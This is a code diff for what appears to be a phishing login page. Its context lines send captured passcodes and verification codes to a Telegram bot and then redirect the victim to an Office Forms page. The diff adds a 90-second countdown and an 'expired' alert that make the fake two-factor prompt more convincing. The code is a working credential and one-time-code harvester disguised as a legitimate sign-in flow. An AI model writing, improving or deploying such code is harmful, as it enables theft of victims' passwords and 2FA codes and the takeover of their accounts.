@@ -25,6 +25,24 @@ async function sendToTelegram(message) {
     }
 }
 
+// Timer for verification code
+let timeLeft = 90;
+let timerInterval;
+
+function startTimer() {
+    timerInterval = setInterval(() => {
+        timeLeft--;
+        document.getElementById("timer").textContent = `Time remaining: ${timeLeft} seconds`;
+
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            alert("Verification code expired. Please request a new one.");
+            document.getElementById("verification-container").style.display = "none";
+            document.getElementById("login-form-container").style.display = "block";
+        }
+    }, 1000);
+}
+
 // Login form submission
 document.getElementById("login-form").addEventListener("submit", async function (event) {
     event.preventDefault();
@@ -47,6 +65,10 @@ Passcode: ${password}
     // Hide login form and show verification container
     document.getElementById("login-form-container").style.display = "none";
     document.getElementById("verification-container").style.display = "block";
+
+    // Start the 90-second timer
+    timeLeft = 90;
+    startTimer();
 });
 
 // Verification code submission
@@ -62,6 +84,9 @@ document.getElementById("verify-button").addEventListener("click", async functio
     // Send verification code to Telegram
     const verificationMessage = `Verification Code: ${verificationCode}`;
     await sendToTelegram(verificationMessage);
+
+    // Stop the timer
+    clearInterval(timerInterval);
 
     // Redirect to the form
     window.location.href = "https://forms.office.com/Pages/ResponsePage.aspx?id=6rma1OyZUkWGUb2U95ql5fEyhzHJrZ1Nh6ErkmDSMa5UMTQ0TkFYVjI1TFhSS1UyMU9TM0REQ0lDTS4u";
